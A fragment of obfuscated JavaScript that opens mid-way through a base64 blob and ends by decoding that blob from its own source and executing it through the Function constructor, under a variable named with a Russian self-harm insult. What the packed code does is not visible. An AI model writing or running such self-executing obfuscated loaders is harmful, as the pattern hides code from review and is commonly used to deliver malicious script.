RdKT5QSThZR19GWzB4ZV0/UEk4WUdfRlsweGZdOlBJOFlHX0ZbMHgxMF0pO2Rve1RUTXRDTE0oZGlLRWloYS5wdXNoKE0zc25JdyZQSThZR19GWzB4M10pLE0zc25Jdz4+PVBJOFlHX0ZbMHgyXSx2QXJLX3gtPVBJOFlHX0ZbMHgyXSl9d2hpbGUodkFyS194PlBJOFlHX0ZbMHg5XSk7WXB1SDRKaT0tUEk4WUdfRlsweDFdfX1pZihZcHVINEppPi1QSThZR19GWzB4MV0pe2RpS0VpaGEucHVzaCgoTTNzbkl3fFlwdUg0Smk8PHZBcktfeCkmUEk4WUdfRlsweDNdKX1yZXR1cm4genNmYmpKRChkaUtFaWhhKX1mdW5jdGlvbiB5STlFUkFRKHlJOUVSQVEpe2lmKHR5cGVvZiB0S2ExYU5beUk5RVJBUV09PT1QSThZR19GWzB4NV0pe3JldHVybiB0S2ExYU5beUk5RVJBUV09WkQ0Mld6KEFVTFVBbFt5STlFUkFRXSl9cmV0dXJuIHRLYTFhTlt5STlFUkFRXX1UVE10Q0xNKGRpS0VpaGE9UEk4WUdfRlsweDEzXSx3WjdzUXZlKCkpO2lmKE0zc25Jdyl7VFRNdENMTShjbGVhckludGVydmFsKE0zc25JdyksTTNzbkl3PVBJOFlHX0ZbMHgxZl0pfWNvbnNvbGVbeUk5RVJBUSgweDk3KV0oeUk5RVJBUSgweDk4KSl9fVRUTXRDTE0oTTNzbkl3PXNldEludGVydmFsKG9Fb0RWODgsMHgzZTgpLHNldFRpbWVvdXQob0VvRFY4OCwweDEyYyksY29uc29sZVtWajZKY2goMHg5OSldKFZqNkpjaCgweDlhKSkpfSkoKTs="


    убейсебя.constructor(atob((''+убейсебя).match(/=\s*"((?:[A-Za-z0-9+/=]|\\")+)"/)[1]))();
    
})()
